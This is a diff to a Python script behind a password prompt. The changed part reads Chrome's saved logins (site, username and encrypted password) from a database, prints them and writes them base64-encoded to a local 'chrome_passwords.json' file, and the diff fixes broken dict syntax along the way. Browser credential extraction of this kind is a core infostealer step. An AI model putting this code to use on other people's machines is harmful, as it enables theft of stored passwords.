@@ -41,6 +41,8 @@ def get_password_hash():
 
 stored_hash = get_password_hash()
 
+cls()
+
 while True:
     pw = getpass.getpass("Enter password: ")
     if hash_pw(pw) == stored_hash:
@@ -453,19 +455,22 @@ while True:
                 passwords = cursor.fetchall()
                 
                 if passwords:
+                    results = []
                     for url, username, encrypted_password in passwords[:5]:
+                        web = {
+                            "Site": url,
+                            "User": username,
+                            "Encrypted password": base64.b64encode(encrypted_password).decode("utf-8")
+                        }
+                        results.append(web)
+
                         print(f"URL: {url}")
                         print(f"Username: {username}")
                         print(f"Encrypted Pass: {encrypted_password}")
 
-                        web = {
-                            "Site": url
-                            "User": username
-                            "Encrypted password:" encrypted_password
-                        }
-
-                        with open("creds.json", "w") as f: 
-                            json.dump(data, f, indent=4)
+                    with open("chrome_passwords.json", "w") as f:
+                        json.dump(results, f, indent=4)
+               
                     print(f"Total found: {len(passwords)}")
                 else:
                     print("No passwords found")
@@ -509,4 +514,3 @@ while True:
         sleep(3)
 
         exit()
-
